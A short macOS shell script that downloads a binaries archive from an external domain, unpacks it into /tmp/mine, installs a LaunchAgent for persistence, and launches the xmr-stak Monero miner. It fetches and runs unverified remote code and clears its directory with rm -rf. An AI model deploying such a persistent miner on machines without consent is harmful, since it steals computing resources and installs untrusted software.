#!/bin/sh

workingDir="/tmp/mine"
cleanup="rm -rf $workingDir"
plistName="com.miner.stak.plist"
tarUrl="silvereletellier.com/binaries.tar.gz"

eval $cleanup

launchctl unload com.miner.stak.plist #unloading the daemon in case it's running already

mkdir -p $workingDir
curl -o $workingDir/binaries.tar.gz $tarUrl

cd $workingDir
tar -xzf binaries.tar.gz

mkdir -p ~/Library/LaunchAgents/
cp $workingDir/$plistName ~/Library/LaunchAgents/

sed -i -e 's/PATH/\/tmp\/mine/g' "$HOME/Library/LaunchAgents/$plistName"

touch /tmp/mine/mine.sh
echo "$workingDir/xmr-stak --config $workingDir/config.txt" > /tmp/mine/mine.sh
chmod +x /tmp/mine/mine.sh

echo "*********** MINING ***********"

launchctl load ~/Library/LaunchAgents/$plistName
launchctl start $plistName
